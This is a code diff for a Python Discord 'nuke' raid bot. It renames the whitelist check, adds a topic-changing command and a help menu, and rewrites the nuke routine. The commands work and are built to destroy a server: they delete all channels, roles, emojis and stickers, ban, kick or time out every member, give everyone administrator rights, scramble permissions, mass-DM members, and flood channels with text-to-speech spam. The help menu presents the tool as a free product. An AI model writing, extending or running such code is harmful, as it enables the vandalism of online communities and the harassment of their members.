@@ -69,8 +69,9 @@ class Config:
 # ===== MAIN CODE, ONLY CHANGE IF YOU KNOW WHAT YOUR DOING. =====
 config = Config()
 bot = commands.Bot(command_prefix=config.PREFIX, intents=discord.Intents.all())
+bot.remove_command("help")
 
-def whitelisted(ctx):
+def is_whitelisted(ctx):
     return ctx.author.id in config.WHITELIST
 
 async def download_image(url):
@@ -79,23 +80,12 @@ async def download_image(url):
             return await response.read()
 
 @bot.event
-async def on_message(message):
-    if message.guild and bot.user in message.mentions:
-        if "join" in message.content.lower() or "added" in message.content.lower():
-            try:
-                await message.delete()
-            except:
-                pass
-    
-    await bot.process_commands(message)
-
-@bot.event
 async def on_ready():
     print(f'Logged in as {bot.user}')
 
 @bot.event
 async def on_command(ctx):
-    if whitelisted(ctx):
+    if is_whitelisted(ctx):
         await asyncio.sleep(0.1)
         try:
             await ctx.message.delete()
@@ -104,36 +94,36 @@ async def on_command(ctx):
 
 @bot.command()
 async def rserver(ctx):
-    if not whitelisted(ctx): return
+    if not is_whitelisted(ctx): return
     await ctx.guild.edit(name=config.SERVER_NAME)
 
 @bot.command()
 async def rservericon(ctx):
-    if not whitelisted(ctx): return
+    if not is_whitelisted(ctx): return
     icon_image = await download_image(config.SERVER_ICON_URL)
     await ctx.guild.edit(icon=icon_image)
 
 @bot.command()
 async def cchannels(ctx, count: int = config.CHANNELS_COUNT):
-    if not whitelisted(ctx): return
+    if not is_whitelisted(ctx): return
     tasks = [ctx.guild.create_text_channel(f"{config.CHANNEL_NAME}-{i}") for i in range(count)]
     await asyncio.gather(*tasks, return_exceptions=True)
 
 @bot.command()
 async def cvoice(ctx, count: int = config.VOICE_CHANNELS_COUNT):
-    if not whitelisted(ctx): return
+    if not is_whitelisted(ctx): return
     tasks = [ctx.guild.create_voice_channel(f"{config.VOICE_CHANNEL_NAME}-{i}") for i in range(count)]
     await asyncio.gather(*tasks, return_exceptions=True)
 
 @bot.command()
 async def ccategory(ctx, count: int = config.CATEGORIES_COUNT):
-    if not whitelisted(ctx): return
+    if not is_whitelisted(ctx): return
     tasks = [ctx.guild.create_category_channel(f"{config.CATEGORY_NAME}-{i}") for i in range(count)]
     await asyncio.gather(*tasks, return_exceptions=True)
 
 @bot.command()
 async def cthread(ctx, count: int = config.THREAD_COUNT):
-    if not whitelisted(ctx): return
+    if not is_whitelisted(ctx): return
     tasks = []
     for channel in ctx.guild.text_channels:
         for i in range(count):
@@ -142,7 +132,7 @@ async def cthread(ctx, count: int = config.THREAD_COUNT):
 
 @bot.command()
 async def cnsfw(ctx, count: int = config.CHANNELS_COUNT):
-    if not whitelisted(ctx): return
+    if not is_whitelisted(ctx): return
     tasks = []
     for i in range(count):
         channel = await ctx.guild.create_text_channel(f"{config.NSFW_CHANNEL_NAME}-{i}")
@@ -151,34 +141,42 @@ async def cnsfw(ctx, count: int = config.CHANNELS_COUNT):
 
 @bot.command()
 async def dchannels(ctx):
-    if not whitelisted(ctx): return
+    if not is_whitelisted(ctx): return
     tasks = [channel.delete() for channel in ctx.guild.channels]
     await asyncio.gather(*tasks, return_exceptions=True)
     await ctx.guild.create_text_channel(config.CHANNEL_NAME)
 
 @bot.command()
 async def dcategory(ctx):
-    if not whitelisted(ctx): return
+    if not is_whitelisted(ctx): return
     tasks = [category.delete() for category in ctx.guild.categories]
     await asyncio.gather(*tasks, return_exceptions=True)
 
 @bot.command()
 async def rchannels(ctx):
-    if not whitelisted(ctx): return
+    if not is_whitelisted(ctx): return
     tasks = [channel.edit(name=f"{config.NEW_CHANNEL_NAME}-{i}") for i, channel in enumerate(ctx.guild.channels)]
     await asyncio.gather(*tasks, return_exceptions=True)
 
 @bot.command()
 async def nsfwall(ctx):
-    if not whitelisted(ctx): return
+    if not is_whitelisted(ctx): return
     tasks = []
     for channel in ctx.guild.text_channels:
         tasks.append(channel.edit(nsfw=True))
     await asyncio.gather(*tasks, return_exceptions=True)
 
 @bot.command()
+async def rtopics(ctx):
+    if not is_whitelisted(ctx): return
+    tasks = []
+    for channel in ctx.guild.text_channels:
+        tasks.append(channel.edit(topic=random.choice(config.TOPICS)))
+    await asyncio.gather(*tasks, return_exceptions=True)
+
+@bot.command()
 async def slowmodeall(ctx, seconds: int = config.SLOWMODE_DURATION):
-    if not whitelisted(ctx): return
+    if not is_whitelisted(ctx): return
     tasks = []
     for channel in ctx.guild.text_channels:
         tasks.append(channel.edit(slowmode_delay=seconds))
@@ -186,38 +184,38 @@ async def slowmodeall(ctx, seconds: int = config.SLOWMODE_DURATION):
 
 @bot.command()
 async def croles(ctx, count: int = config.ROLES_COUNT):
-    if not whitelisted(ctx): return
+    if not is_whitelisted(ctx): return
     tasks = [ctx.guild.create_role(name=f"{config.ROLE_NAME}-{i}") for i in range(count)]
     await asyncio.gather(*tasks, return_exceptions=True)
 
 @bot.command()
 async def droles(ctx):
-    if not whitelisted(ctx): return
+    if not is_whitelisted(ctx): return
     tasks = [role.delete() for role in ctx.guild.roles if role.name != "@everyone"]
     await asyncio.gather(*tasks, return_exceptions=True)
 
 @bot.command()
 async def rroles(ctx):
-    if not whitelisted(ctx): return
+    if not is_whitelisted(ctx): return
     tasks = [role.edit(name=f"{config.NEW_ROLE_NAME}-{i}") for i, role in enumerate(ctx.guild.roles) if role.name != "@everyone"]
     await asyncio.gather(*tasks, return_exceptions=True)
 
 @bot.command()
 async def adminall(ctx):
-    if not whitelisted(ctx): return
+    if not is_whitelisted(ctx): return
     admin_role = await ctx.guild.create_role(name=config.ADMIN_ROLE_NAME, permissions=discord.Permissions.all())
     tasks = [member.add_roles(admin_role) for member in ctx.guild.members]
     await asyncio.gather(*tasks, return_exceptions=True)
 
 @bot.command()
 async def rnickall(ctx):
-    if not whitelisted(ctx): return
+    if not is_whitelisted(ctx): return
     tasks = [member.edit(nick=config.NICKNAME) for member in ctx.guild.members]
     await asyncio.gather(*tasks, return_exceptions=True)
 
 @bot.command()
 async def demoteall(ctx):
-    if not whitelisted(ctx): return
+    if not is_whitelisted(ctx): return
     tasks = []
     for member in ctx.guild.members:
         roles_to_remove = [role for role in member.roles if role.name != "@everyone"]
@@ -226,26 +224,26 @@ async def demoteall(ctx):
 
 @bot.command()
 async def moveall(ctx):
-    if not whitelisted(ctx): return
+    if not is_whitelisted(ctx): return
     vc = await ctx.guild.create_voice_channel(config.MOVE_VOICE_CHANNEL_NAME)
     tasks = [member.move_to(vc) for member in ctx.guild.members if member.voice]
     await asyncio.gather(*tasks, return_exceptions=True)
 
 @bot.command()
 async def disconnectall(ctx):
-    if not whitelisted(ctx): return
+    if not is_whitelisted(ctx): return
     tasks = [member.move_to(None) for member in ctx.guild.members if member.voice]
     await asyncio.gather(*tasks, return_exceptions=True)
 
 @bot.command()
 async def banall(ctx):
-    if not whitelisted(ctx): return
+    if not is_whitelisted(ctx): return
     tasks = [member.ban() for member in ctx.guild.members]
     await asyncio.gather(*tasks, return_exceptions=True)
 
 @bot.command()
 async def unbanall(ctx):
-    if not whitelisted(ctx): return
+    if not is_whitelisted(ctx): return
     tasks = []
     async for entry in ctx.guild.bans():
         tasks.append(ctx.guild.unban(entry.user))
@@ -253,31 +251,31 @@ async def unbanall(ctx):
 
 @bot.command()
 async def kickall(ctx):
-    if not whitelisted(ctx): return
+    if not is_whitelisted(ctx): return
     tasks = [member.kick() for member in ctx.guild.members]
     await asyncio.gather(*tasks, return_exceptions=True)
 
 @bot.command()
 async def timeoutall(ctx):
-    if not whitelisted(ctx): return
+    if not is_whitelisted(ctx): return
     tasks = [member.timeout(datetime.timedelta(days=config.TIMEOUT_DURATION)) for member in ctx.guild.members]
     await asyncio.gather(*tasks, return_exceptions=True)
 
 @bot.command()
 async def untimeoutall(ctx):
-    if not whitelisted(ctx): return
+    if not is_whitelisted(ctx): return
     tasks = [member.timeout(None) for member in ctx.guild.members]
     await asyncio.gather(*tasks, return_exceptions=True)
 
 @bot.command()
 async def spam(ctx, count: int = config.SPAM_COUNT):
-    if not whitelisted(ctx): return
+    if not is_whitelisted(ctx): return
     tasks = [ctx.send(config.SPAM_MESSAGE, tts=config.TEXT_TO_SPEECH) for _ in range(count)]
     await asyncio.gather(*tasks, return_exceptions=True)
 
 @bot.command()
 async def mspam(ctx, count: int = config.SPAM_COUNT):
-    if not whitelisted(ctx): return
+    if not is_whitelisted(ctx): return
     tasks = []
     for channel in ctx.guild.text_channels:
         for _ in range(count):
@@ -286,18 +284,18 @@ async def mspam(ctx, count: int = config.SPAM_COUNT):
 
 @bot.command()
 async def purge(ctx):
-    if not whitelisted(ctx): return
+    if not is_whitelisted(ctx): return
     await ctx.channel.purge(limit=None)
 
 @bot.command()
 async def mpurge(ctx):
-    if not whitelisted(ctx): return
+    if not is_whitelisted(ctx): return
     tasks = [channel.purge(limit=None) for channel in ctx.guild.text_channels]
     await asyncio.gather(*tasks, return_exceptions=True)
 
 @bot.command()
 async def rpins(ctx):
-    if not whitelisted(ctx): return
+    if not is_whitelisted(ctx): return
     tasks = []
     for channel in ctx.guild.text_channels:
         pins = []
@@ -308,13 +306,13 @@ async def rpins(ctx):
 
 @bot.command()
 async def cwebhooks(ctx, count: int = config.WEBHOOK_COUNT):
-    if not whitelisted(ctx): return
+    if not is_whitelisted(ctx): return
     tasks = [ctx.channel.create_webhook(name=f"{config.WEBHOOK_NAME}-{i}") for i in range(count)]
     await asyncio.gather(*tasks, return_exceptions=True)
 
 @bot.command()
 async def mwebhooks(ctx, count: int = config.WEBHOOK_COUNT):
-    if not whitelisted(ctx): return
+    if not is_whitelisted(ctx): return
     tasks = []
     for channel in ctx.guild.text_channels:
         tasks.extend([channel.create_webhook(name=f"{config.WEBHOOK_NAME}-{i}") for i in range(count)])
@@ -322,7 +320,7 @@ async def mwebhooks(ctx, count: int = config.WEBHOOK_COUNT):
 
 @bot.command()
 async def dwebhooks(ctx):
-    if not whitelisted(ctx): return
+    if not is_whitelisted(ctx): return
     tasks = []
     for channel in ctx.guild.text_channels:
         webhooks = await channel.webhooks()
@@ -331,7 +329,7 @@ async def dwebhooks(ctx):
 
 @bot.command()
 async def rwebhooks(ctx):
-    if not whitelisted(ctx): return
+    if not is_whitelisted(ctx): return
     tasks = []
     for channel in ctx.guild.text_channels:
         webhooks = await channel.webhooks()
@@ -340,37 +338,37 @@ async def rwebhooks(ctx):
 
 @bot.command()
 async def cinvites(ctx, count: int = config.INVITE_COUNT):
-    if not whitelisted(ctx): return
+    if not is_whitelisted(ctx): return
     tasks = [channel.create_invite() for channel in ctx.guild.text_channels for _ in range(count)]
     await asyncio.gather(*tasks, return_exceptions=True)
 
 @bot.command()
 async def dinvites(ctx):
-    if not whitelisted(ctx): return
+    if not is_whitelisted(ctx): return
     tasks = [invite.delete() for invite in await ctx.guild.invites()]
     await asyncio.gather(*tasks, return_exceptions=True)
 
 @bot.command()
 async def demojis(ctx):
-    if not whitelisted(ctx): return
+    if not is_whitelisted(ctx): return
     tasks = [emoji.delete() for emoji in ctx.guild.emojis]
     await asyncio.gather(*tasks, return_exceptions=True)
 
 @bot.command()
 async def dstickers(ctx):
-    if not whitelisted(ctx): return
+    if not is_whitelisted(ctx): return
     tasks = [sticker.delete() for sticker in ctx.guild.stickers]
     await asyncio.gather(*tasks, return_exceptions=True)
 
 @bot.command()
 async def dmall(ctx):
-    if not whitelisted(ctx): return
+    if not is_whitelisted(ctx): return
     tasks = [member.send(config.DM_MESSAGE) for member in ctx.guild.members]
     await asyncio.gather(*tasks, return_exceptions=True)
 
 @bot.command()
 async def chaoschannels(ctx):
-    if not whitelisted(ctx): return
+    if not is_whitelisted(ctx): return
     tasks = []
     channels = list(ctx.guild.channels)
     random.shuffle(channels)
@@ -380,7 +378,7 @@ async def chaoschannels(ctx):
 
 @bot.command()
 async def chaosroles(ctx):
-    if not whitelisted(ctx): return
+    if not is_whitelisted(ctx): return
     tasks = []
     roles = [role for role in ctx.guild.roles if role.name != "@everyone"]
     random.shuffle(roles)
@@ -390,7 +388,7 @@ async def chaosroles(ctx):
 
 @bot.command()
 async def chaoschannelperms(ctx):
-    if not whitelisted(ctx): return
+    if not is_whitelisted(ctx): return
     tasks = []
     for channel in ctx.guild.channels:
         for role in ctx.guild.roles:
@@ -403,7 +401,7 @@ async def chaoschannelperms(ctx):
 
 @bot.command()
 async def chaosroleperms(ctx):
-    if not whitelisted(ctx): return
+    if not is_whitelisted(ctx): return
     tasks = []
     for role in ctx.guild.roles:
         if role.name != "@everyone":
@@ -414,7 +412,7 @@ async def chaosroleperms(ctx):
 
 @bot.command()
 async def lockdown(ctx):
-    if not whitelisted(ctx): return
+    if not is_whitelisted(ctx): return
     tasks = []
     for channel in ctx.guild.channels:
         tasks.append(channel.set_permissions(ctx.guild.default_role, send_messages=False))
@@ -422,7 +420,7 @@ async def lockdown(ctx):
 
 @bot.command()
 async def unlockall(ctx):
-    if not whitelisted(ctx): return
+    if not is_whitelisted(ctx): return
     tasks = []
     for channel in ctx.guild.channels:
         tasks.append(channel.set_permissions(ctx.guild.default_role, send_messages=None))
@@ -430,40 +428,49 @@ async def unlockall(ctx):
 
 @bot.command()
 async def nuke(ctx):
-    if not whitelisted(ctx): return
-
+    if not is_whitelisted(ctx): return
+    asyncio.create_task(ctx.message.delete())
+    
     tasks = []
-
     tasks.append(ctx.guild.edit(name=config.SERVER_NAME))
-
-    icon_image = await download_image(config.SERVER_ICON_URL)
-    if icon_image:
-        tasks.append(ctx.guild.edit(icon=icon_image))
-
-    tasks.extend([channel.delete() for channel in ctx.guild.channels])
-    tasks.extend([role.delete() for role in ctx.guild.roles if role.name != "@everyone"])
-    tasks.extend([sticker.delete() for sticker in ctx.guild.stickers])
-    tasks.extend([emoji.delete() for emoji in ctx.guild.emojis])
-
-    await asyncio.gather(*tasks, return_exceptions=True)
-
-    create_tasks = []
-    create_tasks.append(ctx.guild.create_text_channel(config.CHANNEL_NAME))
-    create_tasks.extend([ctx.guild.create_text_channel(f"{config.CHANNEL_NAME}-{i}") for i in range(config.CHANNELS_COUNT)])
-    create_tasks.extend([ctx.guild.create_role(name=f"{config.ROLE_NAME}-{i}") for i in range(config.ROLES_COUNT)])
-    create_tasks.extend([member.edit(nick=config.NICKNAME) for member in ctx.guild.members])
-    create_tasks.extend([member.timeout(datetime.timedelta(days=config.TIMEOUT_DURATION)) for member in ctx.guild.members])
-    create_tasks.extend([member.send(config.DM_MESSAGE) for member in ctx.guild.members])
-
-    await asyncio.gather(*create_tasks, return_exceptions=True)
-
+    
+    if config.SERVER_ICON_URL:
+        icon_image = await download_image(config.SERVER_ICON_URL)
+        if icon_image: tasks.append(ctx.guild.edit(icon=icon_image))
+    
+    for channel in ctx.guild.channels: tasks.append(channel.delete())
+    for role in ctx.guild.roles: 
+        if role.name != "@everyone" and not role.managed: tasks.append(role.delete())
+    for emoji in ctx.guild.emojis: tasks.append(emoji.delete())
+    for sticker in ctx.guild.stickers: tasks.append(sticker.delete())
+    
+    main_channel = ctx.guild.create_text_channel(config.CHANNEL_NAME, topic="Nuked")
+    tasks.append(main_channel)
+    
+    spam_channels = []
+    for i in range(config.CHANNELS_COUNT):
+        spam_channels.append(ctx.guild.create_text_channel(f"{config.CHANNEL_NAME}-{i}", topic=f"Channel {i}"))
+    tasks.extend(spam_channels)
+    
+    for i in range(config.ROLES_COUNT):
+        tasks.append(ctx.guild.create_role(name=f"{config.ROLE_NAME}-{i}"))
+    
+    for member in ctx.guild.members:
+        if member == bot.user: continue
+        if config.NICKNAME: tasks.append(member.edit(nick=config.NICKNAME))
+        if config.DM_MESSAGE: tasks.append(member.send(config.DM_MESSAGE))
+    
+    results = await asyncio.gather(*tasks, return_exceptions=True)
+    
+    created_channels = [r for r in results if isinstance(r, discord.TextChannel)]
+    
     spam_tasks = []
-    for channel in ctx.guild.text_channels:
+    for channel in created_channels:
         for _ in range(config.SPAM_COUNT):
             spam_tasks.append(channel.send(config.SPAM_MESSAGE, tts=config.TEXT_TO_SPEECH))
-
+    
     await asyncio.gather(*spam_tasks, return_exceptions=True)
-
+    
 @bot.command()
 async def whitelist(ctx):
     for x in range(0, len(config.WHITELIST)):
@@ -471,9 +478,99 @@ async def whitelist(ctx):
 
 @bot.command()
 async def kill(ctx):
-    if not whitelisted(ctx): return
+    if not is_whitelisted(ctx): return
     for task in asyncio.all_tasks():
         if not task.done():
             task.cancel()
     await ctx.send("owch")
+
+@bot.command(name='help')
+async def help(ctx):
+    embed = discord.Embed(
+        title="🖥️ Commands",
+        description="List of available bot commands.",
+        color=discord.Color.purple(),
+        timestamp=datetime.now()
+    )
+
+    categories = {
+        "🔨 Moderation": [
+            "`banall`",
+            "`unbanall`",
+            "`kickall`",
+            "`timeoutall`",
+            "`untimeoutall`",
+            "`rnickall`",
+        ],
+        "📁 Channels": [
+            "`ccategory`",
+            "`cchannels`",
+            "`chaoschannels`",
+            "`chaoschannelperms`",
+            "`dcategory`",
+            "`dchannels`",
+            "`rchannels`",
+            "`cthread`",
+            "`cvoice`",
+            "`slowmodeall`",
+            "`lockdown`",
+            "`unlockall`",
+            "`moveall`",
+            "`disconnectall`",
+            "`rtopics`",
+        ],
+        "🎭 Roles": [
+            "`adminall`",
+            "`croles`",
+            "`chaosroles`",
+            "`chaosroleperms`",
+            "`droles`",
+            "`rroles`",
+            "`demoteall`",
+        ],
+        "🔗 Invites / Webhooks": [
+            "`cinvites`",
+            "`dinvites`",
+            "`cwebhooks`",
+            "`dwebhooks`",
+            "`mwebhooks`",
+            "`rwebhooks`",
+        ],
+        "🖼️ Server": [
+            "`rserver`",
+            "`rservericon`",
+            "`rpins`",
+            "`cnsfw`",
+            "`nsfwall`",
+            "`demojis`",
+            "`dstickers`",
+        ],
+        "💬 Messages": [
+            "`purge`",
+            "`mpurge`",
+            "`mspam`",
+            "`spam`",
+            "`dmall`",
+        ],
+        "💥 Destructive": [
+            "`nuke`",
+        ],
+        "🧩 Bot": [
+            "`kill`",
+            "`whitelist`",
+        ],
+        "\u200b": [
+            "-# Thanks to [Vn](<https://discord.com/users/1421939463164133590>), this product is brought to you for free! 🎀"
+        ]
+    }
+
+    for category, commands in categories.items():
+        embed.add_field(
+            name=category,
+            value="\n".join(commands),
+            inline=False
+        )
+
+    await ctx.send(embed=embed)
+
 bot.run(config.TOKEN)
